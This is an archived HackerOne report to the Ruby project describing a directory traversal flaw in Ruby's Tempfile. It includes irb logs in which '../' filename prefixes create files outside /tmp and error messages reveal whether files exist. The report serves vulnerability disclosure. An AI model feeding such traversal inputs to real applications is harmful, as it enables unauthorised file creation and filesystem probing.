# Unintentional file creation caused at Tempfile with directory traversal

## Report Details
- **Report ID**: 302298
- **URL**: https://hackerone.com/reports/302298
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-01-04T05:45:49.237Z
- **Disclosed**: 2018-04-01T09:12:04.817Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
The Tempfile argument of `basename` can use `../` without escaping.
Therefore, directory traversal may occur and unintended files may be generated.


#### create file patern

```log
[vagrant@localhost ~]$ ls .
[vagrant@localhost ~]$ irb
irb(main):001:0> require 'tempfile'
=> true

irb(main):002:0> Tempfile.open(['../../home/vagrant/', '.red'])
=> #<Tempfile:/tmp/../../home/vagrant/20180103-4697-uwqiop.red>
irb(main):003:0> `ls`
=> "20180103-4697-uwqiop.red\n"

irb(main):004:0> Tempfile.new("/../../home/vagrant/green")
=> #<Tempfile:/tmp/../../home/vagrant/green20180103-4697-1wbl81o>
irb(main):005:0> `ls`
=> "20180103-4697-uwqiop.red\ngreen20180103-4697-1wbl81o\n"

irb(main):006:0> Tempfile.create("/../../home/vagrant/blue") {|f| p f.path}
"/tmp/../../home/vagrant/blue20180103-4697-1udvlji"
=> "/tmp/../../home/vagrant/blue20180103-4697-1udvlji"

# It can not be created because suffix specifies a directory that does not exist.
irb(main):007:0> Tempfile.open(['hoge', '/../../home/vagrant/bar'])
Traceback (most recent call last):
        9: from /home/vagrant/.rbenv/versions/2.5.0/bin/irb:11:in `<main>'
        8: from (irb):7
        7: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:291:in `open'
        6: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:291:in `new'
        5: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:131:in `initialize'
        4: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tmpdir.rb:126:in `create'
        3: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `block in initialize'
        2: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `open'
        1: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `initialize'
Errno::ENOENT (No such file or directory @ rb_sysopen - /tmp/hoge20180103-4697-utss0s/../../home/vagrant/bar)
```

#### If the file exists

```log
[vagrant@localhost ~]$ ls
test
[vagrant@localhost ~]$ irb
irb(main):001:0> require 'tempfile'
=> true
irb(main):002:0> Tempfile.new("/../../home/vagrant/test/xxx")
Traceback (most recent call last):
        8: from /home/vagrant/.rbenv/versions/2.5.0/bin/irb:11:in `<main>'
        7: from (irb):2
        6: from (irb):2:in `new'
        5: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:131:in `initialize'
        4: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tmpdir.rb:126:in `create'
        3: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `block in initialize'
        2: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `open'
        1: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `initialize'
Errno::ENOTDIR (Not a directory @ rb_sysopen - /tmp/../../home/vagrant/test/xxx20180103-4783-1f4l2ox)
```

## Impact

An unintended file may be generated in places other than the assumed directory.
It is possible to confirm the existence of the file by using the occurrence or not a directory error.

## Attachments
No attachments
